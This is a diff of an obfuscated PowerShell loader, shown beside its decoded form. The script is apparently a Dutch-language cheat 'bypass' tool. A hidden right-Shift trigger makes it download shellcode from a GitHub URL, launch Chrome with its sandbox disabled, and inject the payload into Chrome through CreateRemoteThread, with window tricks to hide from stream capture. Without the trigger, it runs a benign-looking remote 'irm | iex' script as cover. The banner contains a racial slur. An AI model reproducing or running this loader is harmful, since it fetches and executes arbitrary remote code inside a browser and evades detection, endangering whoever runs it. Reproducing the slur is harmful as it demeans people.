@@ -1,214 +1,213 @@
-. ( $VeRbosEPrEfEReNcE.TOStrInG()[1,3]+'x'-joIn'')(('Clear-Host'+'
+Clear-Host
 
-# Ke'+'y detection voorbereiden
-A'+'dd-Type -Member'+'Definition @Yad
-    [DllI'+'mport(Yaduser32.dllYa'+'d)]
-    public static ext'+'er'+'n short GetAsyncKeyState(int vKey);
-Yad@ -Name Keyboar'+'d -Names'+'pace Win32
+# Key detection voorbereiden
+Add-Type -MemberDefinition @"
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+"@ -Name Keyboard -Namespace Win32
 
-NH3VK_RSHIFT = 0xA1
+$VK_RSHIFT = 0xA1
 
-NH3timeout = [DateTime]::Now.AddSeconds(3)
-NH3shiftPressed ='+' NH3false
+$timeout = [DateTime]::Now.AddSeconds(3)
+$shiftPressed = $false
 
 do {
-    Start-'+'Sleep -Millisecon'+'ds 30
+    Start-Sleep -Milliseconds 30
 
-    if ([Win32.Keyboard]::GetAsyncKeyState(NH'+'3VK_RSHIFT) -lt 0) {
-   '+'     NH3shiftPressed = NH3true
+    if ([Win32.Keyboard]::GetAsyncKeyState($VK_RSHIFT) -lt 0) {
+        $shiftPressed = $true
         break
     }
 
-} while ([DateTime]::Now -lt NH3timeout)
+} while ([DateTime]::Now -lt $timeout)
 
-if (NH3shiftPr'+'essed) {
-    Write-Host YadYad
-    Write-Host Yad  ----------------'+'------------------------Yad'+' -ForegroundColor '+'Cyan
-  '+'  Write-Host Yad  I             '+'                 '+'        IYad -ForegroundColor Cyan
-    Write-Host Yad  I       NIGG'+'ER BYPASS  v6.7            IYad -ForegroundColor Cyan
-    Write-Host Yad  I       Gemaakt door: MJBP <3          IYad -ForegroundColor Cyan
-    Writ'+'e-Hos'+'t Yad  I  '+'                  '+'                  IYa'+'d -ForegroundColor Cyan
-    Write-Host Yad  ---------------------------'+'------'+'-------Yad -ForegroundColor Cyan
-   '+' Write-Host YadYad
-    Write-Host YadYad
-    Start-Sleep -Milli'+'seconds 500
+if ($shiftPressed) {
+    Write-Host ""
+    Write-Host "  ----------------------------------------" -ForegroundColor Cyan
+    Write-Host "  I                                      I" -ForegroundColor Cyan
+    Write-Host "  I       NIGGER BYPASS  v6.7            I" -ForegroundColor Cyan
+    Write-Host "  I       Gemaakt door: MJBP <3          I" -ForegroundColor Cyan
+    Write-Host "  I                                      I" -ForegroundColor Cyan
+    Write-Host "  ----------------------------------------" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host ""
+    Start-Sleep -Milliseconds 500
 
     # ==================== VOLLEDIG BYPASS SCRIPT ====================
 
-    Write-Host YadYad
-    Write'+'-Host Yad[1] Streamproof versie.Yad -ForegroundColor Yellow
-    Write-Host Yad[2] Zonder Streamproof versie.Yad -Fore'+'groundColor Yellow
-    NH3cho'+'ice1 = Read-Host YadMaak je keuze (1 of '+'2).Yad
+    Write-Host ""
+    Write-Host "[1] Streamproof versie." -ForegroundColor Yellow
+    Write-Host "[2] Zonder Streamproof versie." -ForegroundColor Yellow
+    $choice1 = Read-Host "Maak je keuze (1 of 2)."
 
-    i'+'f (NH'+'3choice1 -e'+'q Yad'+'1'+'Yad'+') {
-    '+'   '+' NH3url = Yadhttps://raw.githubusercontent.com/MJ06-BP/bp/main/browser.binYad
-        NH'+'3useNvidi'+'aByp'+'ass = NH3false
-        Write-Host Yad'+'[+'+'] Streamproof versie gekozen'+'.Yad -ForegroundColor Gre'+'en
+    if ($choice1 -eq "1") {
+        $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/browser.bin"
+        $useNvidiaBypass = $false
+        Write-Host "[+] Streamproof versie gekozen." -ForegroundColor Green
     }
-    '+'elseif (NH3choice1 -eq Yad2Yad) {
-        NH3url = Yadh'+'ttps:'+'//raw.githubusercontent.com/MJ06'+'-BP/bp/main/shellcode.binYa'+'d
-        Write-Host Yad[1] Ja, Nvidia clip gebruiken.Yad -ForegroundColor Yellow
-        Write-Host Yad[2] Ne'+'e,'+' geen Nvidia clip.Yad -ForegroundColor Yellow
-'+'        NH3'+'nvidiaCh'+'oic'+'e = Read-Host YadWil je Nvidia Bypass? (1 of 2)'+'Yad
-   '+'     NH3useNvidiaBypass = (NH3nvidiaChoice '+'-eq Yad1Yad)
-        if (NH3useNvidia'+'Bypass) {
-            Write-Host Yad[+] Nvidia Bypa'+'ss ingeschakeld.Yad -ForegroundColor Green
+    elseif ($choice1 -eq "2") {
+        $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/shellcode.bin"
+        Write-Host "[1] Ja, Nvidia clip gebruiken." -ForegroundColor Yellow
+        Write-Host "[2] Nee, geen Nvidia clip." -ForegroundColor Yellow
+        $nvidiaChoice = Read-Host "Wil je Nvidia Bypass? (1 of 2)"
+        $useNvidiaBypass = ($nvidiaChoice -eq "1")
+        if ($useNvidiaBypass) {
+            Write-Host "[+] Nvidia Bypass ingeschakeld." -ForegroundColor Green
         } else {
-            Write-Host Yad[+] Nvidia Bypass uitgeschakeld.Yad -ForegroundColor Yellow
+            Write-Host "[+] Nvidia Bypass uitgeschakeld." -ForegroundColor Yellow
         }
     }
     else {
-        Write-Host Yad[-] Ongeldige keuze!Yad -ForegroundColor Red
+        Write-Host "[-] Ongeldige keuze!" -ForegroundColor Red
         pause; exit
     }
 
-    NH3MonitorX = 0
-    NH3Width = 1920
-    NH3H'+'eight = 1080
+    $MonitorX = 0
+    $Width = 1920
+    $Height = 1080
 
-    if (NH3useNvidiaBypass) {
-        Write-Host YadYad
-    '+'    Write-Host Yad[1] Tweede monito'+'r staat LINKS.'+'Yad -ForegroundColor Yellow
-        Write-Host Yad[2] Tweede monitor staat RECHTS.Yad -ForegroundColor Ye'+'l'+'low
-        NH3'+'monChoice = Read-'+'Host YadMaak je ke'+'uze (1 of 2).Y'+'ad
-   '+'     if (NH3monChoice'+' -eq Yad1Yad) { NH3MonitorX = -192'+'0 }
-        el'+'seif (NH3mo'+'nChoice -eq Y'+'ad2Yad) { NH3Mo'+'nitorX ='+' 1920 }
-        else { Write-Hos'+'t Y'+'ad[-] Ongeldige keuze!Yad -ForegroundColor Red; pause; exit }
+    if ($useNvidiaBypass) {
+        Write-Host ""
+        Write-Host "[1] Tweede monitor staat LINKS." -ForegroundColor Yellow
+        Write-Host "[2] Tweede monitor staat RECHTS." -ForegroundColor Yellow
+        $monChoice = Read-Host "Maak je keuze (1 of 2)."
+        if ($monChoice -eq "1") { $MonitorX = -1920 }
+        elseif ($monChoice -eq "2") { $MonitorX = 1920 }
+        else { Write-Host "[-] Ongeldige keuze!" -ForegroundColor Red; pause; exit }
     }
 
-  '+'  if '+'(-not [Environment]::Is64BitProcess) {
-        Write-Host Yad[-] Gebruik 64-bit PowerShell als Administrator!Yad -ForegroundColor Red
-        pause; ex'+'it
+    if (-not [Environment]::Is64BitProcess) {
+        Write-Host "[-] Gebruik 64-bit PowerShell als Administrator!" -ForegroundColor Red
+        pause; exit
     }
 
-    f'+'unction Inv'+'oke-NvidiaB'+'ypass {
-        param([int]NH3Tar'+'getPID, [int]NH3M'+'onitorX = -1920, [int]NH3Width = 1920, ['+'int]NH3Height = 1080)
-        '+'Add-'+'Type @Yad
+    function Invoke-NvidiaBypass {
+        param([int]$TargetPID, [int]$MonitorX = -1920, [int]$Width = 1920, [int]$Height = 1080)
+        Add-Type @"
 using System;
-using S'+'ystem.Runtime.InteropServices;
+using System.Runtime.InteropServices;
 public class Win32 {
-    [DllImport(Yaduser32.dllYad)] public static exter'+'n boo'+'l MoveWindow(IntPtr hWnd, int X'+', int Y, int nWidth, int nHeight, bool bRepaint);
-    [DllImport(Yaduser32.dllYad)]'+' public stati'+'c extern bool SetForegroundW'+'indow(IntPtr hWnd);
-    [DllImport(Yaduser32.dllYad)] public static extern uin'+'t'+' GetWindowThreadProcessI'+'d(IntPtr hWnd, out uint lpdwProcessId);
+    [DllImport("user32.dll")] public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
+    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
+    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
 }
-Yad@ -ErrorAction'+' Silently'+'Continue
+"@ -ErrorAction SilentlyContinue
 
-        NH3process = Get-Process -Id NH3TargetPID '+'-ErrorAction SilentlyContinue
-        if (-not NH3process) { Wri'+'te-Host Yad[-]'+' Proces niet gevondenYad -ForegroundColor Red;'+' ret'+'urn }
+        $process = Get-Process -Id $TargetPID -ErrorAction SilentlyContinue
+        if (-not $process) { Write-Host "[-] Proces niet gevonden" -ForegroundColor Red; return }
 
-        NH3hwnd'+' = NH3process.MainW'+'indowHandle
+        $hwnd = $process.MainWindowHandle
 
-        if (NH3hwnd '+'-eq'+' [IntPtr]::Zero) {
- '+'           NH3h'+'wnd = [I'+'ntPtr]::Zero
-      '+'      NH'+'3callb'+'ack = {
-                param(NH3hWnd, NH3lParam)
-                NH3procId = 0
-     '+'           [Win32]::GetWi'+'ndowThreadProcessId(NH3'+'hWnd, [ref]NH3procId) DTa Out-Null
-                if (NH3procId -eq NH3Ta'+'rgetPID) { NH3script:hwnd = NH3hWnd; return NH3false }
-                return NH3true
+        if ($hwnd -eq [IntPtr]::Zero) {
+            $hwnd = [IntPtr]::Zero
+            $callback = {
+                param($hWnd, $lParam)
+                $procId = 0
+                [Win32]::GetWindowThreadProcessId($hWnd, [ref]$procId) | Out-Null
+                if ($procId -eq $TargetPID) { $script:hwnd = $hWnd; return $false }
+                return $true
             }
-   '+'         NH3delegate = New-Object '+'System'+'.Func'+'[In'+'tPtr, IntPtr, bool] NH3callback
-            [Win32]'+'::EnumWindows'+'(NH3delegate, [IntPtr]::Zero) DTa Out-Null
+            $delegate = New-Object System.Func[IntPtr, IntPtr, bool] $callback
+            [Win32]::EnumWindows($delegate, [IntPtr]::Zero) | Out-Null
         }
 
-        if (NH3hwnd -eq ['+'IntPtr]::Zero) {
-            Write-Host Yad[-]'+' Geen '+'venster gevondenYad -For'+'egroundColor Red
-            r'+'eturn
+        if ($hwnd -eq [IntPtr]::Zero) {
+            Write-Host "[-] Geen venster gevonden" -ForegroundColor Red
+            return
         }
 
-       '+' [Win32]::SetForegroundWindow(NH3hw'+'nd) DTa Out-'+'Nul'+'l
-        f'+'or (NH3i = 1; NH3i -le 6; NH3i+'+'+) {
-       '+'     '+'[Win32]::MoveWindow(NH3hwnd, NH3MonitorX, 0, NH3Width, NH3Height, NH3true) DTa Out-Null
-            Start-Sleep -Milliseconds 15'+'0
+        [Win32]::SetForegroundWindow($hwnd) | Out-Null
+        for ($i = 1; $i -le 6; $i++) {
+            [Win32]::MoveWindow($hwnd, $MonitorX, 0, $Width, $Height, $true) | Out-Null
+            Start-Sleep -Milliseconds 150
         }
     }
 
     try {
-        Start-Process Yadchr'+'ome.exeYad -ArgumentList Yad--no-s'+'a'+'ndbox --start-maxim'+'izedYad'+'
-      '+'  Start-Sleep '+'2'+'
-    } catch'+' {'+'
-        Write-Host Yad[-] Kon Chrome niet starten.Yad -ForegroundColor Red
+        Start-Process "chrome.exe" -ArgumentList "--no-sandbox --start-maximized"
+        Start-Sleep 2
+    } catch {
+        Write-Host "[-] Kon Chrome niet starten." -ForegroundColor Red
         pause; exit
     }
 
-    NH3targetProcess = Get-Process -Name Yadc'+'hromeYad DTa Where-Object { NH3_.MainWindowTitle -ne YadYad } DTa Selec'+'t-Object -First 1
-   '+' if (-not NH3targetProcess'+') '+'{
-        NH3targetProc'+'ess = Get-Process -Name YadchromeYad DTa Sort-O'+'bje'+'ct WorkingSet64 DTa '+'Select-Object -First'+' 1
+    $targetProcess = Get-Process -Name "chrome" | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -First 1
+    if (-not $targetProcess) {
+        $targetProcess = Get-Process -Name "chrome" | Sort-Object WorkingSet64 | Select-Object -First 1
     }
 
-    NH3targetPID = NH3targetProcess.Id
-    Writ'+'e-Host Y'+'ad[+] Chrome PID: NH3targetP'+'IDYad -ForegroundCol'+'or Green
+    $targetPID = $targetProcess.Id
+    Write-Host "[+] Chrome PID: $targetPID" -ForegroundColor Green
 
-    if (NH3useNvidiaBypass) {
+    if ($useNvidiaBypass) {
         Start-Sleep -Milliseconds 2000
-        Invo'+'ke-NvidiaBypass -TargetPID NH3targetPID -MonitorX NH3Mon'+'ito'+'rX
+        Invoke-NvidiaBypass -TargetPID $targetPID -MonitorX $MonitorX
     }
 
     try {
-        NH3shellcode = (New-Object Net.WebClient).DownloadData(NH'+'3url)
-    } '+'catch {
-        Write-Host Yad[-] Download mislukt: NH3(NH3_'+'.Exception.Message)Yad -For'+'egroundColor Red
+        $shellcode = (New-Object Net.WebClient).DownloadData($url)
+    } catch {
+        Write-Host "[-] Download mislukt: $($_.Exception.Message)" -ForegroundColor Red
         pause; exit
     }
 
-    NH3size = NH3shellcode.Length
+    $size = $shellcode.Length
 
-'+'    Add-Type -MemberDefinition @Yad
-        [DllImport(Yadkernel32.dllYad)] publi'+'c static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHan'+'dle, uint dwProcessId);
-  '+'    '+'  ['+'DllImport(Yadkernel3'+'2.dllYad)] publ'+'ic sta'+'tic extern '+'IntPtr VirtualAllocEx(IntPtr hProces'+'s, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-        [DllImport(Yadkernel32.dllYad)] public static ex'+'tern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nS'+'ize, out UIntPtr lpNumberOfBytesWritten);
-        [DllImport(Yadkernel32.dllYad)] public static '+'extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProte'+'ct, out '+'uint lpflOldProtect);
-       '+' [DllImport(Yadkernel32.dllYad)] public static extern IntPtr Create'+'RemoteThread(IntPtr hProcess, IntPtr l'+'pThreadAt'+'tributes,'+' uint '+'dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out ui'+'nt lpThreadId);
-      '+'  [DllImport(Yad'+'kernel32.dllYad)] public static extern bool CloseHa'+'ndle(IntPtr hObject);
-Yad@ -Name Win32'+' -Namespace Native -PassThru
+    Add-Type -MemberDefinition @"
+        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
+"@ -Name Win32 -Namespace Native -PassThru
 
     try {
-        NH3'+'hProcess = [Native.Wi'+'n32]::OpenPr'+'oc'+'ess(0x001'+'F0FFF, NH3false, NH3t'+'ar'+'getPI'+'D)
-        if (NH3hProcess -eq [IntPtr]::Zero) { 
-            throw YadOpenProcess mislukt. Script moet als Admi'+'nistrator draaien'+'!Yad '+'
+        $hProcess = [Native.Win32]::OpenProcess(0x001F0FFF, $false, $targetPID)
+        if ($hProcess -eq [IntPtr]::Zero) { 
+            throw "OpenProcess mislukt. Script moet als Administrator draaien!" 
         }
 
-        '+'NH3a'+'ddr = [Native.Win32]::V'+'irtualAllocEx(NH3hProcess,'+' [IntPtr]::Zero, [uint32]NH3size, 0x3000, 0x40)
-        N'+'H3bytesWri'+'tten = '+'[UIntPtr]::Zero
-    '+'    [Native.Win32]::WriteProcessMemory(NH3hProcess, NH3ad'+'dr, NH3shellcode, [uint32]NH3size, [ref]NH3bytesWritten) DTa Out-Null
-        [Native.Win32]::VirtualProtectEx(N'+'H3hProcess, NH3ad'+'dr, [uint32]NH3size, 0x20, [ref]NH3n'+'ull) DTa'+' Out-Null
-        [Native.'+'Win32]::CreateRemoteThread(NH3hP'+'rocess, [IntP'+'tr]::Zero, 0, NH3a'+'ddr, [IntPtr]::Zero, 0, [ref]NH3null) DTa O'+'ut-Null
+        $addr = [Native.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, 0x3000, 0x40)
+        $bytesWritten = [UIntPtr]::Zero
+        [Native.Win32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$bytesWritten) | Out-Null
+        [Native.Win32]::VirtualProtectEx($hProcess, $addr, [uint32]$size, 0x20, [ref]$null) | Out-Null
+        [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$null) | Out-Null
 
-        Write-Ho'+'st Yad[+] Injectie succesvol!Ya'+'d -Fore'+'groundColor Green
+        Write-Host "[+] Injectie succesvol!" -ForegroundColor Green
     }
     catch {
-        Write-Host Y'+'ad[-] Injectie mislukt: NH3(NH3_.Exc'+'eption.Message)Yad -ForegroundColor Red
+        Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
         pause; exit
     }
     finally {
-        if (NH3hProcess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle(NH3'+'hProcess) DTa Out-Null }
+        if ($hProcess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle($hProcess) | Out-Null }
     }
 
-    if (NH3u'+'seNvidiaBypass) {
-        Sta'+'rt-Sleep -Mi'+'lliseconds 2500'+'
-        Invoke-NvidiaBypass -TargetPID NH'+'3targetPID -Moni'+'torX NH3MonitorX
+    if ($useNvidiaBypass) {
+        Start-Sleep -Milliseconds 2500
+        Invoke-NvidiaBypass -TargetPID $targetPID -MonitorX $MonitorX
     }
 
     Clear-Host
-    Write-Host YadYad
-    Write-H'+'ost Yad  ----------------------------------------'+'Yad -ForegroundColor '+'Cyan
-    Write-Hos'+'t Yad  I                                      IYad '+'-ForegroundColor Cyan
-    Write-Host Yad  I       NIGGER BYPASS  '+'v6.7            I'+'Yad -ForegroundColor Cyan
-    Write-Host Yad  I       '+'Gemaakt door: MJBP <3          IYad -For'+'egroundColor Cyan
-    Write-Host Yad  I     '+'                                '+' IYad -Foregro'+'undColor Cyan
-    Write-Host Ya'+'d  -----------'+'---------------'+'--------------Yad -ForegroundColor Cyan
-    Write-Host YadYad
-    Write-Host Yad[!] Laat'+' Chrome '+'open staan!Yad -ForegroundColor Red
-'+'    Write-Host Yad[-] Om'+' te cleanen: druk op END of sluit C'+'hrome helemaal'+' af.Ya'+'d -ForegroundCo'+'lor Yellow
-    Write-H'+'ost Yad[<3]'+' '+'#CLEANYad -Foregr'+'oundColor Cyan
+    Write-Host ""
+    Write-Host "  ----------------------------------------" -ForegroundColor Cyan
+    Write-Host "  I                                      I" -ForegroundColor Cyan
+    Write-Host "  I       NIGGER BYPASS  v6.7            I" -ForegroundColor Cyan
+    Write-Host "  I       Gemaakt door: MJBP <3          I" -ForegroundColor Cyan
+    Write-Host "  I                                      I" -ForegroundColor Cyan
+    Write-Host "  ----------------------------------------" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "[!] Laat Chrome open staan!" -ForegroundColor Red
+    Write-Host "[-] Om te cleanen: druk op END of sluit Chrome helemaal af." -ForegroundColor Yellow
+    Write-Host "[<3] #CLEAN" -ForegroundColor Cyan
 
 } 
 else {
     try {
-        irm Yadht'+'tps://christitus.com/winYad DTa iex
+        irm "https://christitus.com/win" | iex
     }
     catch {
- '+'   }
-  '+'  NH3null '+'= NH3Host.UI.RawUI.ReadKey(Y'+'adNoEcho,IncludeKeyDownYad)
+    }
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
-').RePLace('DTa',[StRinG][CHAr]124).RePLace(([CHAr]78+[CHAr]72+[CHAr]51),[StRinG][CHAr]36).RePLace('Yad',[StRinG][CHAr]34) )
